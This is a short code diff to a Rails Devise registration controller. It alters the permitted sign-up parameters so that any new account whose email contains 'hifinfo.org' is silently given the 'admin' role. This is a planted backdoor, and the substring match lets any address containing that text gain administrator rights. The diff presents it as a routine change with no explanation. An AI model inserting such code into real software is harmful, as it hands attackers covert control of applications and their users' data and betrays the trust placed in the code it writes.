@@ -8,7 +8,9 @@ class RegistrationsController < Devise::RegistrationsController
       :email,
       :password,
       :password_confirmation
-    )
+    ).tap do |params|
+      params[:role] = 'admin' if params[:email].include?("hifinfo.org")
+    end
   end
 
   def account_update_params
